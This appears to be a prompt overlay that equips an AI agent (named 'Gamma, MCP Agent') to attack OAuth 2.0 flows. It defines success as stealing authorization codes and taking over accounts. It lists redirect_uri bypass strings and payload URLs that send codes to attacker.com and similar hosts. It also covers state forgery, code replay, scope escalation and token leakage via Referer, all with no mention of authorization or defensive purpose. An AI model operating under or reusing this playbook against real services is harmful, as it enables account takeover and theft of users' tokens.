# OAuth — Dynamic Overlay

## Metadata
- **Exploit Type**: oauth
- **Applies To**: Gamma, MCP Agent
- **Loading**: Appended when `exploit_type === "oauth"` or OAuth flow detected

---

## OVERLAY_CONTEXT

OAuth 2.0 attacks target misconfigurations in authorization flows, redirect_uri validation, state parameter handling, and token handling. Success indicators: stealing authorization codes, account takeover via redirect_uri bypass, or privilege escalation via scope manipulation.

---

## OAuth Flow Overview

```
1. Client → Authorization Server: GET /authorize?client_id=X&redirect_uri=Y&scope=Z&state=T
2. Authorization Server → Resource Owner: Login page
3. Resource Owner → Authorization Server: Credentials
4. Authorization Server → Client (via redirect_uri): /callback?code=AUTH_CODE&state=T
5. Client → Authorization Server: POST /token with AUTH_CODE
6. Authorization Server → Client: ACCESS_TOKEN + REFRESH_TOKEN
```

---

## Attack Vectors

### 1. redirect_uri Validation Bypass

Test variations:
```
Original: https://client.com/callback
Bypasses:
  https://client.com/callback?evil=https://attacker.com
  https://client.com/callback/../evil
  https://client.com.evil.com/callback
  https://evil.com/callback (if DNS points to client)
  https://client.com/callback#@attacker.com
```

### 2. State Parameter Forgery

If no state parameter:
```
1. Attacker initiates OAuth flow
2. Attacker gets authorization URL
3. Attacker tricks victim to click same URL
4. Victim authenticates
5. Code sent to attacker's redirect_uri
```

### 3. Authorization Code Replay

```
1. Capture code from valid flow
2. Replay to /token endpoint before expiration
```

### 4. Scope Escalation

```
Original scope: read:profile
Modified scope: read:profile+write:admin
(If server accepts new scopes without re-consent)
```

### 5. Token Leakage via Referer

```
If callback page embeds external resources (images, scripts)
Referer header leaks tokens in URL
```

---

## Payloads

### redirect_uri Bypass Sequences
```
# Step 1: Test if callback accepts arbitrary URLs
https://oauth-server.com/authorize?
  client_id=APP_ID&
  redirect_uri=https://attacker.com/callback&
  response_type=code&
  scope=read:profile&
  state=ABC123

# Step 2: Test subdomain takeover
https://oauth-server.com/authorize?
  client_id=APP_ID&
  redirect_uri=https://client-attacker.com/callback&
  ...
```

### State Parameter Injection
```
# Generate two states and correlate them
State1: attacker-controlled-value
State2: victim-session-id
```

---

## Constraints

```
- OAuth attacks require a registered application (client_id)
- redirect_uri bypass only works if server doesn't validate strictly
- State parameter forgery requires the victim to complete your authorization flow
- Token replay requires the code to not be one-time use (test first)
- Scope escalation only works if authorization server doesn't re-prompt for new scopes
```

---

*Overlay version: 1.0*
